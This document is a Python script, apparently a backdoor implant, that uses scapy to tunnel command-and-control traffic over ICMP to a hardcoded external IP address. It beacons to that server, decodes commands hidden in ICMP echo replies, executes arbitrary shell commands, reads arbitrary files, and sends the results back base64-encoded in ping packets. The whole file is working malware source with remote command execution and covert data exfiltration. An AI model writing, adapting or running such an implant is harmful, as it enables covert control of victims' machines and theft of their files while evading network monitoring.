#!/usr/bin/python3

from scapy.all import *
from threading import Thread, Lock
from base64 import *
import os
import time

c2_server="13.53.243.249"
stop=0
send_mutex=Lock()
chunk_size=1300

def send_res(content):
	try:
		global chunk_size
		payload = b64encode(content.encode('utf-8'))
		payload_frag = [payload[i-chunk_size:i] for i in range(chunk_size, len(payload)+chunk_size, chunk_size)]
		for frag in payload_frag:
			packet=IP(dst=c2_server)/ICMP(type="echo-request")/frag
			send(packet, verbose=False)
			time.wait(1/50)
	except Exception as e:
		print(e)
		
def handle_cmd(msg):
	try:
		cmd_lst = msg.split()
		if(cmd_lst[0] == 'START'):
			valid = 0
			trailer = ""
			if(cmd_lst[1] == 'Run'):
				result = os.popen(" ".join(cmd_lst[2:]))
				raw = result.read()
				result.close()
				trailer = " RUN END"
				valid = 1
			elif(cmd_lst[1] == 'Send'):
				with open(cmd_lst[2], mode="rb") as bin_file:
					raw = bin_file.read().hex()
				trailer = " FILE END"
				valid = 1
				
			if(valid):
				send_res(raw + trailer)			
	except Exception as e:
		print(e)	

def recieve_cmd():
	try:
		global stop
		while not stop:
			rp = sniff(filter="icmp and icmp[0]=0", count=1)
			send_mutex.acquire()
			msg = b64decode(rp[0][Raw].load).decode('ascii')
			handle_cmd(msg)
			send_mutex.release()
	except Exception as e:
		print(e)
	finally:
		return
	

def beacon(content):
	try:
		send_mutex.acquire()
		send_res(content)
		send_mutex.release()
		time.sleep(10)
	except Exception as e:
		print(e)

def main():
	try:
		rcv_thrd = Thread(target=recieve_cmd)
		rcv_thrd.start()
	except:
		print("cant start listen/response thread")
		
	try:
		content = 'READY END'
		while True:
			beacon(content)
			
	except KeyboardInterrupt:
		global stop
		stop=1
		rcv_thrd.join()
		quit()
	except Exception as e:
		print(e)
		
if __name__=="__main__":
	main()
